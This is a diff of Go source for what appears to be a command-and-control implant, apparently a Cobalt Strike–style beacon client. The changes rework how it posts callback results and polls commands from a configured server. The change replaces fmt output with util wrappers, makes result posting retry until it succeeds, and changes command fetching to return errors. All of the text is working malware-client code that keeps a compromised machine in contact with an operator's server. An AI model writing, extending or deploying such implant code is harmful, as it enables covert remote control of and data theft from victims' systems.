@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"crypto/tls"
 	"errors"
-	"fmt"
 	"main/config"
 	"main/util"
 	"math/rand"
@@ -27,7 +26,7 @@ func init() {
 		err := httpRequest.SetProxyUrl(config.ProxyUrl)
 		if err != nil {
 			// 31 CALLBACK_ERROR
-			PushResult(31, []byte(fmt.Sprintf("error proxy url: %s", config.ProxyUrl)))
+			PushResult(31, []byte(util.Sprintf("error proxy url: %s", config.ProxyUrl)))
 			os.Exit(1)
 		}
 	}
@@ -53,11 +52,12 @@ func HttpPost(data []byte) *req.Resp {
 	data = append(data, []byte(config.PostClientAppend)...)
 	data = append([]byte(config.PostClientPrepend), data...)
 
+	// push result may need to continually send packets until success
 	for {
 		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
 		resp, err := httpRequest.Post(url, data, headers, param)
 		if err != nil {
-			fmt.Printf("!error: %v\n", err)
+			util.Printf("!error: %v\n", err)
 			time.Sleep(time.Second * 5)
 			continue
 		} else {
@@ -84,29 +84,22 @@ func HttpGet(data []byte) ([]byte, error) {
 
 	url := config.Host + config.GetUri[rand.Intn(len(config.GetUri))]
 
-	for {
-		// provide 2 header args is supported
-		resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader)
-		// just pull command again
-		if err != nil {
-			fmt.Printf("!error: %v\n", err)
-			time.Sleep(time.Second * 5)
-			continue
-			//panic(err)
-		} else {
-			if resp.Response().StatusCode == http.StatusOK {
-				payload, err2 := resolveServerResponse(resp)
-				if err2 != nil {
-					fmt.Println(err)
-					time.Sleep(time.Second * 5)
-					continue
-				}
-				return payload, nil
+	// provide 2 header args is supported
+	resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader)
+	// if error occurred, just wait for next time
+	if err != nil {
+		return nil, err
+	} else {
+		if resp.Response().StatusCode == http.StatusOK {
+			payload, err2 := resolveServerResponse(resp)
+			if err2 != nil {
+				return nil, err
 			}
-			break
+			return payload, nil
+		} else {
+			return nil, errors.New("http status is not 200")
 		}
 	}
-	return nil, errors.New("shouldn't be accessed at HttpGet")
 }
 
 // extract payload
